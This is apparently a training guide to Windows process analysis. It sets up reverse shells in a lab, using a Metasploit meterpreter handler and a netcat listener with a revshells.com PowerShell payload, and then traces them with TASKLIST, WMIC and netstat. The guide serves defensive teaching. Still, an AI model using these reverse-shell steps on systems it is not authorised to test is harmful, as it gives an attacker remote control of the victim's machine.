# Windows Process Analysis

A practical guide to understanding, monitoring, and analyzing Windows processes — including a hands-on walkthrough of launching a reverse shell and tracing it back using native Windows tools.

---

## Part 1 — Understanding Windows Processes

### What Is a Process?

A **process** is a running instance of a program or application. When you double-click an executable (`.exe`), the operating system loads it into memory and creates a process around it. Each process operates within its own **partitioned set of system resources**, meaning it is allocated:

- **CPU time** — scheduled slices of processor time
- **Memory (RAM)** — a private virtual address space isolated from other processes
- **I/O handles** — file descriptors, network sockets, and device handles

This isolation is fundamental to system stability: a crash in one process does not directly corrupt another.

---

### Categories of Windows Processes

#### a) System Processes (Windows Core)

These are processes launched and managed directly by the Windows kernel or the Session Manager. They handle core operating system functions such as session initialization, authentication, and hardware abstraction.

| Process | Role |
|---|---|
| `System` | Kernel-level threads; handles hardware interrupts and I/O |
| `smss.exe` | **Session Manager Subsystem** — first user-mode process launched by the kernel; initializes sessions and launches `csrss.exe` |
| `csrss.exe` | **Client/Server Runtime Subsystem** — manages the Windows console, process/thread creation at the Win32 level, and shutdown procedures |

> ⚠️ These processes run under the `NT AUTHORITY\SYSTEM` account and should **never** be terminated manually. Their absence or unexpected behavior is a strong indicator of malware or system compromise.

---

#### b) User Application Processes

These are processes initiated by a logged-in user, either directly (by double-clicking an application) or indirectly (by a script or another application). They run in **user space** and have limited privileges unless explicitly elevated.

| Process | Application |
|---|---|
| `chrome.exe` | Google Chrome browser |
| `notepad.exe` | Windows Notepad text editor |
| `minesweeper.exe` | Minesweeper game |

---

#### c) Service / Background Processes

Services are long-running background processes that typically start at boot and continue running without a user interface. They are managed through the **Windows Service Control Manager (SCM)** and often run under privileged system accounts.

| Process | Role |
|---|---|
| `svchost.exe` | Generic host for Windows services running from DLLs |
| `spoolsv.exe` | **Windows Print Spooler** — manages print queues |
| `wuauserv` (hosted in `svchost`) | **Windows Update** — checks and applies system updates |
| `lsass.exe` | **Local Security Authority Subsystem** — handles authentication, password hashing, and Kerberos tickets |

> ⚠️ `lsass.exe` is a high-value target for credential dumping attacks (e.g., Mimikatz). Any process attempting to open a handle to it with `PROCESS_VM_READ` is suspicious.

---

### Parent–Child Process Relationships

Windows processes exist in a **hierarchical tree**. When a process spawns another, it becomes its **parent**, and the new process is its **child**. This relationship is tracked by the operating system via the **Parent Process ID (PPID)**.

Understanding the parent–child chain is critical for forensic analysis — malware often spawns child processes to execute payloads while hiding behind legitimate parents.

**Example chain:**

```
explorer.exe  (PID: 1716)
    └── firefox.exe  (spawned by the user clicking the browser icon)
            └── notepad++.exe  (spawned by Firefox, e.g., as a helper or via exploit)
```

In this example:
- `explorer.exe` is the **shell** (the Windows desktop process). It is the natural parent for anything a user launches from the desktop or taskbar.
- `firefox.exe` is a **child** of `explorer.exe`.
- `notepad++.exe` is a **grandchild** of `explorer.exe` and a **child** of `firefox.exe`.

> 🔍 **Anomaly detection tip:** If `notepad++.exe` (or any unexpected process) appears as a child of a browser, this can indicate a browser-based exploit that has achieved code execution.

---

## Part 2 — Hands-On: Launching and Detecting a Reverse Shell

This section walks through a simulated attack scenario using a **reverse shell** payload, then demonstrates how to detect and investigate the resulting suspicious process using native Windows tools.

> ⚠️ **This is for educational and authorized penetration testing purposes only.** Never run these techniques on systems you do not own or have explicit written permission to test.

---

### Step 1 — Setting Up the Listener (Linux / Kali)

On the attacker's Linux machine, open a terminal and launch Metasploit in quiet mode:

```bash
msfconsole -q
```

Inside Metasploit, configure a multi-handler to catch incoming connections:

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST enp0s3        # Your Linux network interface name
msf6 exploit(multi/handler) > set LPORT 4444           # Port to listen on
msf6 exploit(multi/handler) > exploit
```

Metasploit is now listening on port `4444`, waiting for a connection from the victim machine.

---

### Step 2 — Executing the Payload (Windows / Victim)

On the Windows machine, open a Command Prompt **as Administrator** and navigate to the directory containing the payload:

```cmd
cd C:\Users\tcm\Downloads
dir
notmalware.exe      ← Execute the fake malware payload
```

> In a real engagement, `notmalware.exe` would be a Meterpreter stager generated with `msfvenom`. It connects back to the attacker's IP and port, establishing a reverse shell session.

---

### Step 3 — Process Analysis After Execution

Once the payload runs, use the following commands to investigate running processes from another CMD window on the Windows machine.

---

#### `TASKLIST` — List All Running Processes

```cmd
TASKLIST
```
Displays a table of all active processes with:
- **Image Name** — the `.exe` filename
- **PID** — the unique Process ID
- **Session Name / Session#** — which user session it belongs to
- **Memory Usage** — how much RAM the process is consuming

---

#### `TASKLIST /V` — Verbose Output

```cmd
TASKLIST /V
```
Adds extra columns including:
- **Status** (Running, Not Responding)
- **Username** — which account owns the process
- **Window Title** — the title of any visible window

---

#### `TASKLIST /M` — Show Loaded Modules (DLLs)

```cmd
TASKLIST /M
```
Lists every DLL loaded by each process. Useful for identifying **DLL injection** — a technique where malware injects a malicious DLL into a legitimate process.

---

#### `TASKLIST /M /FI` — Filter by Process Name

```cmd
TASKLIST /M /FI "IMAGENAME eq notmalware.exe"
```
Shows only the modules loaded by a specific process, filtered by its executable name. Replace `notmalware.exe` with the name of the suspicious process.

---

#### `TASKLIST /M /FI` — Filter by PID

```cmd
TASKLIST /M /FI "PID eq 7852"
```
Same as above but filtered by Process ID. Useful when you already know the PID from a previous `TASKLIST` run.

---

#### `WMIC` — Windows Management Instrumentation Command-Line

`WMIC` provides low-level access to process metadata, including the parent–child relationship.

**Get details for a specific PID:**
```cmd
WMIC process where processid=7895 get name, parentprocessid, processid
```

Output example:
```
Name              ParentProcessId  ProcessId
notmalware.exe    3412             7895
```

Here `3412` would be the PID of the process that launched `notmalware.exe` (e.g., `cmd.exe` or `explorer.exe`).

---

**Search all processes for a related PID:**
```cmd
WMIC process get name, parentprocessid, processid | find "7858"
```
Scans the full process list and returns any row containing `7858` — useful for mapping out a process family tree.

---

## Part 3 — Reverse Shell via Netcat

This section demonstrates a simpler reverse shell using **Netcat** (no Metasploit), and shows how to decode and trace the shell back using `netstat` and `WMIC`.

---

### Step 1 — Set Up the Listener (Linux)

```bash
nc -lvnp 3333
```

- `-l` — listen mode
- `-v` — verbose output
- `-n` — do not resolve hostnames (faster)
- `-p 3333` — listen on port 3333

---

### Step 2 — Generate the Reverse Shell Payload (Windows Target)

Go to a reverse shell generator (e.g., [revshells.com](https://www.revshells.com/)):
- Set **IP** to your Linux machine's address: `192.168.1.4`
- Set **Port** to `3333`
- Select **PowerShell Base64** or **CMD** format
- Copy the generated one-liner

On the **Windows machine**, open `cmd.exe` and paste the payload, then press Enter.

---

### Step 3 — Connection Received (Linux)

Back on the Linux terminal, you should see:

```
Connection received on 192.168.1.9:4787
```

You now have a command shell running on the Windows machine, remotely controlled from Linux.

---

### Step 4 — Investigate the Connection (Windows)

On the Windows machine (or from another admin session), run:

```cmd
netstat -anob
```

- `-a` — show all connections and listening ports
- `-n` — show addresses numerically (no DNS resolution)
- `-o` — show the owning PID for each connection
- `-b` — show the executable responsible for each connection

Look for a line showing an **ESTABLISHED** connection to `192.168.1.4:3333`. Note the **PID** associated with it, for example `6592`.

---

### Step 5 — Retrieve the Full Command Line of the Suspicious Process

```cmd
WMIC process where processid=6592 get commandline
```

This returns the **full command line** used to launch the process. For a Base64-encoded PowerShell payload, the output might look like:

```
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -e <BASE64_STRING>
```

Copy the long Base64 string (the part after the `-e` flag).

---

### Step 6 — Decode the Payload (Linux)

Back on the Linux machine, decode the Base64 string to reveal the original plaintext command:

```bash
echo "<BASE64_STRING>" | base64 -d
```

This will reveal the actual reverse shell command that was encoded and passed to PowerShell — confirming exactly what the payload was doing and what it connected back to.

---

## Summary

| Tool | What It Tells You |
|---|---|
| `TASKLIST` | All running processes with PID, session, and memory |
| `TASKLIST /V` | Adds username and status to each process |
| `TASKLIST /M` | Lists DLLs loaded by each process (detects DLL injection) |
| `TASKLIST /FI` | Filters output by process name or PID |
| `WMIC process get` | Deep metadata: name, PID, PPID, full command line |
| `netstat -anob` | Active network connections mapped to PIDs and executables |
| `base64 -d` | Decodes obfuscated Base64 payloads |

---

*This guide is intended for cybersecurity students, ethical hackers, and system administrators performing authorized security assessments.*
